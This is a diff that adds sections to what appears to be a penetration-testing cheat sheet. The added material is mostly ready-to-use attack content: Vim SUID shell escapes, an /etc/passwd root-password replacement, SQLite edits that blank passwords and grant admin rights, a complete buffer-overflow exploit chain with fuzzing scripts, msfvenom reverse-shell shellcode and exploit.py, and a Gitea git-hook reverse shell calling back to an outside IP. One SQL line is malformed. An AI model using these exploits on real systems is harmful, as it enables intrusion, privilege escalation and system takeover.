@@ -389,6 +389,14 @@ union SELECT SYS.DATABASE_NAME,'b',1 FROM v$version--
 
 ## References
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
+
+[SQLITE]
+## Command
+sqlite3 databse.db
+.tables
+select * from user;
+.schema user
+UPDATE user SET passwd = "" where id 2;
 ```
 
 ### Hydra
@@ -2279,6 +2287,25 @@ sudo /sbin/initctl start test
 
 ```
 
+### Vim
+
+```bash
+# SUID
+vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+vim.basic -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")
+```
+
+### Passwd Writable
+
+```bash
+# Change root password
+-> openssl passwd password123
+-> replace in root row
+-> root:c.gVrEYFACZTQ:0:0:root:/root:/bin/bash
+
+```
 
 # D. Exploit/CVE/Abuse/Misconf
 
@@ -2672,6 +2699,159 @@ https://msandbu.org/printnightmare-cve-2021-1675/
 https://www.huntress.com/blog/critical-vulnerability-printnightmare-exposes-windows-servers-to-remote-code-execution
 ```
 
+### Buffer Overflow (BOF)
+
+```bash
+=======Setup mona.py=======
+# Download mona.py
+wget https://raw.githubusercontent.com/corelan/mona/master/mona.py
+
+# Upload into the machine
+certutil -URLCache -f http://10.10.10.10/mona.py mona.py
+
+# Put into Immunity Debugger Folder
+C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands\mona.py
+@
+C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\mona.py
+
+# Run Immunity Debugger and config mona (Make sure run as Administrator)
+!mona config -set workingfolder c:\mona\%p
+
+=======Mona Commands=======
+# Config Mona
+!mona config -set workingfolder c:\mona\%p
+
+# Create bytearray
+!mona bytearray -b "\x00" # BadCharacter
+
+# Find Offset with length of pattern created
+!mona findmsp -distance 2400
+
+# Compare bad characters with ESP
+!mona compare -f C:\mona\binary\bytearray.bin -a 0124FA18 #ESP
+
+# Find the jump point
+!mona jmp -r esp -cpb "\x00\x0a" # BadCharacter
+
+=======Fuzzing (fuzzer.py)=======
+import socket, time, sys
+
+ip = "192.168.0.195"
+
+port = 31337
+timeout = 5
+strings = b"A" * 50
+
+while True:
+        try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(timeout)
+                s.connect((ip,port))
+                s.send(strings + b"\r\n")
+                print(s.recv(1024))
+        except:
+                print("Fuzzing crashed at {} bytes".format(len(strings)))
+                sys.exit(0)
+        strings += b"A" * 50
+        time.sleep(1)
+		
+=======Finding offset=======
+msf-pattern_create -l 150 # Create Pattern
+!mona findmsp -distance 150 # Mona commands to find offset
+
+# crash.py
+import socket, time, sys
+
+ip = "192.168.0.195"
+port = 31337
+
+payload = b"<PATTERN HERE>"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip,port))
+s.send(payload + b"\r\n")
+print(s.recv(1024))
+
+# crash2.py
+import socket, time, sys
+
+ip = "192.168.0.195"
+port = 31337
+
+offset = 146
+overflow = b"A" * offset
+retrn = b"BBBB"
+payload = overflow + retrn
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip,port))
+s.send(payload + b"\r\n")
+print(s.recv(1024))
+
+=======Finding Bad Characters & Jump Point=======
+!mona bytearray -b "\x00" # Generate Bytearray
+!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 020C19F8  # Check bad character we found
+!mona jmp -r esp -cpb  "\x00\x0a" # Find jump point
+
+# badchar.py
+print("\t----------------------")
+print("\t|    BAD CHARACTER   |")
+print("\t----------------------")
+print("\n[+] Example No Badchar (Please include \\x00) => Enter Bad Characters: \\x00")
+print("[+] Example Got Badchar => Enter Bad Characters: \\x02\\x03\\x04")
+
+INPUTS = raw_input("\n[+] Enter Bad Characters: ")
+OUTPUT_INPUTS = r"{0}".format(INPUTS)
+LISTREM = INPUTS.split("\\x")
+LISTBADCHAR = r""
+for x in range(1,256):
+        if "{:02x}".format(x) not in LISTREM:
+                LISTBADCHAR += r"\x" + "{:02x}".format(x)
+print(LISTBADCHAR)
+
+# badchar_check.py
+import socket, time, sys
+
+ip = "192.168.0.195"
+port = 31337
+
+offset = 146
+overflow = b"A" * offset
+retrn = b"BBBB"
+strings = b"<PUT BADCHAR HERE>"
+payload = overflow + retrn + strings
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip,port))
+s.send(payload + b"\r\n")
+print(s.recv(1024))
+
+=======Final=======
+# msfvenom
+msfvenom -p windows/shell_reverse_tcp LHOST=eth0 LPORT=443 -b '\x00\x0a' EXITFUNC=thread -f python -v strings
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -b '\x00\x0a' EXITFUNC=thread -f python -v strings
+
+# exploit.py
+import socket, time, sys
+
+ip = "192.168.0.195"
+port = 31337
+
+offset = 146
+overflow = b"A" * offset
+retrn = b"\xc3\x14\x04\x08"
+strings =  b""
+strings += b"\xbf\xa3\xe1\x47\xc1\xda\xd7\xd9\x74\x24\xf4\x5e"
+# <MORE PAYLOAD>
+padding =  b"\x90" * 16
+payload = overflow + retrn + padding + strings
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip,port))
+s.send(payload + b"\r\n")
+print(s.recv(1024))
+```
+
 # E. CMS/Web/Application
 
 ### Wordpress
@@ -2904,6 +3084,34 @@ perl exploit.pl 10.10.10.10 10000 /etc/passwd 0
 
 ```bash
 
+```
+
+### Gitea
+
+```bash
+# Location 
+/etc/gitea
+
+# Reverse Shell
+- Choose one repo
+- Go to Git Hooks
+- Put reverse shell in contents of Post-receive
+
+#!/bin/bash
+bash -i >& /dev/tcp/10.4.3.51/443 0>&1
+
+- git clone, git add . and git commit.
+
+# Database (Change Password)
+sqlite3 database.db
+select passwd from user;
+select passwd_hash_algo from user;
+select 
+
+# Database (Change is_admin)
+sqlite3 database.db
+select id,name,is_admin from user;
+update user set is_admin=1 where id=3;
 ```
 
 # F. Reverse Shell
